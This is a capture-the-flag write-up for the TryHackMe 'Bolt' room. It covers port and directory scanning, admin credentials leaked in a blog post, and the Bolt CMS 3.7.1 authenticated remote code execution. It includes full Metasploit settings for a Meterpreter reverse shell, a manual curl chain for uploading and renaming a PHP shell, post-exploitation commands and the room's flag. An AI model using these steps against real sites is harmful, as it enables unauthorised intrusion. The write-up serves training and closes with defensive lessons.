# TryHackMe — Bolt

> **Difficulty:** Easy
> **Category:** Web / CMS Exploitation
> **Skills:** Recon, Information Disclosure, Authenticated RCE, Metasploit
> **CVE:** Bolt CMS 3.7.1 — Authenticated Remote Code Execution

---

## Summary

Box demonstrates a classic chain of failures in CMS deployment:

1. **Information disclosure** — admin credentials posted in plain text on the public blog.
2. **Authenticated RCE** in Bolt CMS 3.7.1 — admin file editor allows execution of arbitrary PHP via theme/template manipulation, bypassing the upload extension whitelist.

End-to-end path: public blog post → admin login → Metasploit module → reverse shell as `www-data` → flag.

---

## Recon

### Nmap

```bash
nmap -sV -sC -p- 10.64.151.213 -oN nmap_full.txt
```

Three ports open:

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH 7.6p1 (Ubuntu) | No creds yet |
| 80/tcp | HTTP | Apache 2.4.29 | Default Ubuntu page — decoy |
| 8000/tcp | HTTP | PHP 7.2.32 | **Bolt CMS** — target |

Two key fingerprints from port 8000:

```html
<meta name="generator" content="Bolt">
<title>Bolt | A hero is unleashed</title>
```

Nmap NSE script `http-generator` parses the `<meta name="generator">` tag and confirms the CMS without manual inspection.

### Web Enumeration

Initial mistake worth documenting: ran `gobuster` against port 80 first — empty result, since the CMS lives on `:8000`. **Lesson:** scan each web port separately; never trust the default.

```bash
gobuster dir -u http://10.64.151.213:8000 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak -t 50
```

Notable paths:
- `/bolt` — admin login panel (standard Bolt CMS path)
- `/files` — uploaded files directory
- `/theme/base-2018/` — active theme

---

## Information Disclosure

Browsing the homepage on port 8000 reveals two blog posts. The post **"Message for IT Department"** contains a glaring OPSEC failure:

> *"Hey guys, i suppose this is our secret forum right? I posted my first message for our readers today but there seems to be a lot of freespace out there. Please check it out! my password is `boltadmin123` just incase you need it!*
> *Regards, Jake (Admin)"*

Cross-referencing the second post **"Message From Admin"**:

> *"my username is `bolt`"*

**Credentials harvested:** `bolt:boltadmin123`

Login at `http://10.64.151.213:8000/bolt/login` — successful. Admin panel reveals **Bolt CMS 3.7.1** in the footer.

---

## Vulnerability Identification

```bash
searchsploit bolt 3.7
```

Result: **EDB-ID 48296** — *Bolt CMS 3.7.1 — Authenticated Remote Code Execution* (by r3m0t3nu11).

A corresponding Metasploit module is also available:

```
exploit/unix/webapp/bolt_authenticated_rce
```

### Mechanics

The vulnerability is not in the file upload itself — Bolt's upload whitelist (`accept_file_types` in `config.yml`) correctly blocks `.php` files and `application/x-php` MIME-types via a hardcoded blacklist.

The bypass exploits the **admin file editor** (`fileedit` permission in `permissions.yml`):

1. Authenticate as admin and obtain a CSRF token.
2. Upload a payload with a whitelisted extension (e.g., `.png` or `.twig`) containing PHP code.
3. Use the file editor / rename functionality to change its extension to `.php` — this code path skips the upload validator.
4. Trigger execution by requesting the renamed file directly.

This is a textbook **trust boundary failure**: upload validation was hardened, but rename/edit endpoints reused a different (looser) validator. Defense-in-depth was inconsistent across endpoints.

---

## Exploitation

Used the Metasploit module for reliability:

```
msfconsole -q
use exploit/unix/webapp/bolt_authenticated_rce
set RHOSTS 10.64.151.213
set RPORT 8000
set USERNAME bolt
set PASSWORD boltadmin123
set LHOST <tun0_ip>
set LPORT 4444
set PAYLOAD php/meterpreter/reverse_tcp
run
```

Output:

```
[*] Started reverse TCP handler on <tun0_ip>:4444
[*] Authenticating as user 'bolt'
[*] Sending payload
[*] Sending stage (...)
[*] Meterpreter session 1 opened
meterpreter >
```

Foothold obtained as `www-data`.

---

## Post-Exploitation

```
meterpreter > shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@bolt:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bolt:/$ find / -name "flag.txt" 2>/dev/null
/home/flag.txt
www-data@bolt:/$ cat /home/flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```

**Flag:** `THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}`

The flag was readable directly by `www-data` — no privilege escalation required for this room.

---

## Manual Exploitation Path (for reference)

If MSF is unavailable, the manual chain is straightforward:

1. **Get session cookie + CSRF token:**
   ```bash
   curl -c cookies.txt -s http://10.64.151.213:8000/bolt/login | grep csrf
   ```

2. **Login:**
   ```bash
   curl -b cookies.txt -c cookies.txt -X POST \
     -d "username=bolt&password=boltadmin123&_csrf_token=<TOKEN>" \
     http://10.64.151.213:8000/bolt/login
   ```

3. **Upload payload as `.png`** through `/bolt/files`, then rename to `.php` via the file edit endpoint.

4. **Trigger:** request `http://10.64.151.213:8000/files/shell.php` to execute the PHP reverse shell.

The published PoC (`48296.py`) automates this entire chain and is worth reading for the exact request sequence.

---

## Lessons Learned

- **CMS fingerprinting is trivial** — `<meta name="generator">`, HTTP headers, favicon hashes, and predictable admin paths (`/bolt`, `/wp-admin`, `/administrator`) all leak the technology stack instantly.
- **Information disclosure in user-generated content** is consistently underestimated. Public posts, comments, and commit messages routinely leak credentials in real-world engagements.
- **Admin = RCE in most CMS platforms by design.** Once authenticated as admin, the ability to edit theme files, install plugins/extensions, or manipulate templates almost always leads to code execution. Treat admin compromise as RCE during threat modeling.
- **Defense-in-depth must be applied consistently across all endpoints.** Bolt validated uploads correctly, but the rename/edit code path used different (weaker) validation — a single inconsistent endpoint nullified the entire control.
- **Always scan every open web port separately.** Port 80 was a decoy here; the real target was on 8000.

---

## References

- [Exploit-DB 48296 — Bolt CMS 3.7.1 Authenticated RCE](https://www.exploit-db.com/exploits/48296)
- [Bolt CMS Documentation — Permissions](https://docs.bolt.cm/configuration/permissions)
- Metasploit module: `exploit/unix/webapp/bolt_authenticated_rce`
